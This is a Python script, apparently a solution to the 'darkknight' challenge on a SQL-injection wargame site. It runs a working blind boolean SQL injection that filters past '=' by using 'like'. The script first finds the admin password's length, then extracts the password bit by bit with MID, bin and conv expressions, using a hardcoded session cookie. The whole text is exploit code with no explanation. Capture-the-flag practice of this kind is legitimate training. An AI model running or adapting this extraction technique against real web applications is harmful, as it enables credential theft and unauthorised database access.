import requests
url="https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
header={"Cookie":"PHPSESSID=vrtv56j0c39a3evo84vq6p1ded"}
sess=requests.session()

payload="?no=0 or length(pw) like "
for i in range(1,100):
    pay=url+payload+str(i)+"%23"
    x=sess.get(pay,headers=header)
    print("Check:",i,end=" ")
    
    if "Hello admin" in x.text:
        length=i
        break
    else:
        print("Fail")
print("Success\nlength:",length)


payload="?no=0 or length(pw) like 8 and "
password=''
for i in range(1,length+1):
    bits=''
    print("check:",i,end="")
    for j in range(1,length+1):
        pay=url+payload+"MID(lpad(bin(conv(hex(MID(pw,"+str(i)+",1)),16,10)),8,0),"+str(j)+",1) like 1%23"
        x=sess.get(pay,headers=header)
        
        
        if "Hello admin" in x.text:
            bits+='1'
        else:
            bits+='0'
    password+=''.join(chr(int(bits, 2)))
    print("\t",chr(int(bits,2)))
print("Password:"+password)



